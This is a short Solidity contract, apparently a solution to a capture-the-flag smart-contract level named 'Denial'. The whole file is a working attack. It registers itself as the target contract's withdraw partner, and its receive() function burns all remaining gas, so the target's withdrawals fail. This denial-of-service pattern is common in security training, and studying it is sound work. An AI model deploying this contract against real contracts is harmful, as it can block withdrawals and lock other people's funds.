// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import { Denial } from "./Denial.sol";

contract DenialAttack {
    uint256 public gasBurner;
    function attack(address _denialAddress) public {
        Denial(payable(_denialAddress)).setWithdrawPartner(address(this));
    }
    receive() external payable {
        // BURN ALL THE GAS
        while (gasleft() > 0) {
            keccak256(abi.encodePacked(blockhash(block.number), gasBurner));
            gasBurner++;
        }
    }
}